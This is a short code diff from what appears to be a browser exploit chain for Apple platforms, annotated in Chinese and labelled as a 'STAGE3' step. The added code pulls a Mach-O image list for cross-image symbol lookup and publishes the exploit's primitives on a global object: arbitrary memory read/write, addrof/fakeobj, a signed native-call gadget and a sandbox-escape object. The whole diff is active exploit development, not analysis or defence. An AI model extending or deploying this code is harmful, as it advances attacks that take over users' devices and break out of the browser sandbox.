@@ -1810,12 +1810,23 @@ r.lA = () => {// Entry point: resolves APIs, builds payload, executes sandbox es
         const _ps = _platMod && _platMod.platformState;
         if (_ps && _ps.caller && _ps.sandboxEscape && _ps.sandboxEscape.machOParser && _ps.exploitPrimitive) {
             const _Int64 = _utilMod && _utilMod.Int64;
+            // ── ImageList (nt class): 从 machOParser.Sh() 获取，支持跨 image 符号解析（Kh(name)） ──
+            var _imageList = null;
+            try {
+                var _mop = _ps.sandboxEscape.machOParser;
+                if (_mop && typeof _mop.Sh === 'function') {
+                    _imageList = _mop.Sh();
+                }
+            } catch(_ilErr) {
+                try { if (typeof window.log === 'function') window.log("[STAGE3] machOParser.Sh() failed: " + _ilErr); } catch(_){}
+            }
             window._corunaPrimitives = {
                 caller:           _ps.caller,                // callSigned: .jd(targetInt64, ...upTo8ArgInt64s) → Int64
                 sandboxEscape:    _ps.sandboxEscape,          // 含 vd(trampoline)/Hd/Dd(结果缓冲)/newInt64OfSomething(size)分配内存
                 machOParser:      _ps.sandboxEscape.machOParser,  // .dlsym("_sym") → Int64 指针
                 exploitPrimitive: _ps.exploitPrimitive,      // .read32(bigint)/write64(bigint,val)/addrof/fakeobj/readRawBigInt/readInt64FromOffset
                 Int64:            _Int64,
+                imageList:        _imageList,   // nt instance: .Kh(sym) → cross-image dlsym, .Jh(path)/.Hh(path)/.Gh(substr)/.images
                 toInt64:          function(v) {
                     if (_Int64 && _Int64.fromNumber) return _Int64.fromNumber(v);
                     if (_Int64) return new _Int64(v, 0);
@@ -1824,7 +1835,7 @@ r.lA = () => {// Entry point: resolves APIs, builds payload, executes sandbox es
             };
             window._corunaKeepPrimitives = true;  // 防御性标志：若 index.html 将来加 cleanup，应检查此标志
             if (typeof window.log === 'function') {
-                window.log("[STAGE3] Exposed primitives to window._corunaPrimitives (caller/machOParser/exploitPrimitive/Int64). nativeBridge can now be built.");
+                window.log("[STAGE3] Exposed primitives to window._corunaPrimitives (caller/machOParser/exploitPrimitive/Int64, imageList=" + (_imageList ? 'ok' : 'null') + "). nativeBridge can now be built.");
             }
         } else {
             if (typeof window.log === 'function') {
